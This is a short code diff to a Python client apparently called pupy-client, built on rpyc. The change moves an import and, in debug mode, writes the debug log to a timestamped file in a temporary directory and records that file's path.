@@ -57,7 +57,6 @@ logging.basicConfig()
 logger = logging.getLogger('pp')
 logger.setLevel(logging.WARNING)
 
-import time
 from rpyc.core.service import Service, ModuleNamespace
 from rpyc.lib.compat import execute
 
@@ -760,11 +759,19 @@ def main():
         sys.exit("No such launcher: %s" % LAUNCHER)
 
     if debug:
+        import time
+        import tempfile
+
         root_logger = logging.getLogger()
         root_logger.handlers = []
 
-        log_to_file = logging.FileHandler(
-            'pupy-client-{}-debug.log'.format(os.getpid()))
+        log_file_path = os.path.join(
+            tempfile.mkdtemp(),
+            'pupy-client-{}-{}-debug.log'.format(int(time.time()), os.getpid()))
+
+        pupy.infos['debug_logfile'] = log_file_path
+
+        log_to_file = logging.FileHandler(log_file_path)
         log_to_file.setFormatter(
             logging.Formatter(
                 '%(asctime)-15s|%(levelname)-5s|%(relativeCreated)6d|%(threadName)s|%(name)s| %(message)s'))
